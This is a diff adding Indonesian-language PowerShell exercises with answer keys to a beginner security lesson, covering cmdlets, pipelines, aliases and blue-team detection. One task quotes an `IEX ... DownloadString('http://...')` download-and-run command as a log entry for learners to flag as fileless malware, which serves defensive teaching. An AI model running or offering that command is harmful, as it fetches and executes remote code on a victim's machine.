@@ -594,6 +594,95 @@ Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
 Get-PSSessionConfiguration | Format-Table Name, Permission
 ```
 
+## Latihan
+
+Butuh Windows. Kalau tidak punya, pakai VM evaluasi Windows gratis dari Microsoft, atau install PowerShell 7 di Linux (`pwsh`) untuk Task 1 sampai 3.
+
+### Task 1: tebak cmdlet-nya
+
+| Kebutuhan | Cmdlet |
+|:---|:---|
+| Melihat isi folder termasuk file tersembunyi | |
+| Membaca 10 baris terakhir sebuah file | |
+| Mencari kata "password" di semua file `.txt` | |
+| Mengecek apakah port 443 di sebuah host terbuka | |
+| Melihat anggota grup Administrators | |
+
+<details><summary>Kunci jawaban</summary>
+
+1. `Get-ChildItem -Force`
+2. `Get-Content file.txt -Tail 10`
+3. `Select-String -Path *.txt -Pattern "password"`
+4. `Test-NetConnection -ComputerName host -Port 443`
+5. `Get-LocalGroupMember -Group "Administrators"`
+
+</details>
+
+### Task 2: pipeline objek
+
+Jalankan lalu jawab:
+
+```powershell
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, Id, CPU
+Get-ChildItem C:\Windows -File | Measure-Object
+Get-Service | Where-Object {$_.Status -eq "Running"} | Measure-Object
+```
+
+1. Proses apa yang paling banyak memakai CPU di mesinmu?
+2. Ada berapa file (bukan folder) langsung di `C:\Windows`?
+3. Ada berapa service yang sedang berjalan?
+4. Kenapa di PowerShell kamu bisa menulis `Sort-Object CPU` tanpa memotong kolom teks seperti `awk` di Linux?
+
+<details><summary>Kunci jawaban</summary>
+
+Jawaban 1 sampai 3 berbeda di tiap mesin. Untuk nomor 4: output PowerShell berupa objek yang punya properti bernama (`CPU`, `Name`, `Id`), jadi kamu memanggil propertinya langsung. Linux meneruskan teks biasa, sehingga kolomnya harus dipotong manual.
+
+</details>
+
+### Task 3: alias
+
+`ls`, `dir`, dan `gci` sebenarnya cmdlet yang sama. Buktikan dengan:
+
+```powershell
+Get-Alias ls, dir, gci, cat, ps
+```
+
+Masing-masing alias itu menunjuk ke cmdlet apa?
+
+<details><summary>Kunci jawaban</summary>
+
+`ls`, `dir`, `gci` → `Get-ChildItem` · `cat` → `Get-Content` · `ps` → `Get-Process`
+
+</details>
+
+### Task 4: sisi blue team
+
+1. Cek language mode sesimu: `$ExecutionContext.SessionState.LanguageMode`. Apa hasilnya?
+2. Execution policy bisa di-bypass per proses. Lalu kontrol apa yang benar-benar membatasi skrip yang boleh jalan?
+3. Event ID berapa yang mencatat isi script block PowerShell?
+4. Di log, kamu melihat `IEX (New-Object Net.WebClient).DownloadString('http://...')` dijalankan dari akun staf keuangan. Kenapa ini mencurigakan?
+
+<details><summary>Kunci jawaban</summary>
+
+1. Biasanya `FullLanguage` di mesin pribadi.
+2. WDAC atau AppLocker, dipadukan dengan Constrained Language Mode.
+3. 4104 (Script Block Logging). 4103 untuk Module Logging.
+4. Perintah itu mengunduh skrip dari internet lalu langsung menjalankannya di memori tanpa menyimpan file. Pola ini khas malware fileless, dan staf keuangan hampir tidak pernah punya alasan menjalankannya.
+
+</details>
+
+### Lab gratis
+
+| Tool | Yang bisa dilatih | Biaya |
+|:---|:---|:---|
+| Windows Evaluation VM (Microsoft) | Windows lengkap untuk lab, berlaku sekitar 90 hari | Gratis |
+| PowerShell 7 (`pwsh`) di Linux | Cmdlet dasar dan pipeline objek | Gratis |
+| Microsoft Learn: "Introduction to PowerShell" | Modul belajar resmi | Gratis |
+
+Kamu dianggap lulus pelajaran ini kalau bisa menulis pipeline `Get-Process | Where-Object | Sort-Object | Select-Object` sendiri, dan tahu kenapa execution policy bukan batas keamanan.
+
+---
+
 ---
 
 > Referensi & Sumber Buku:
@@ -601,7 +690,6 @@ Get-PSSessionConfiguration | Format-Table Name, Permission
 > - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
 > - Allen Harper et al. — *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
 > - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview) · Script Block Logging · JEA · Constrained Language Mode
-> - [HackTheBox Academy - Windows Fundamentals](https://academy.hackthebox.com)
 > - `Get-Help <cmdlet> -Full`
 
 > Zero2Root | Basics Series | kodoktheGr3at | 2026
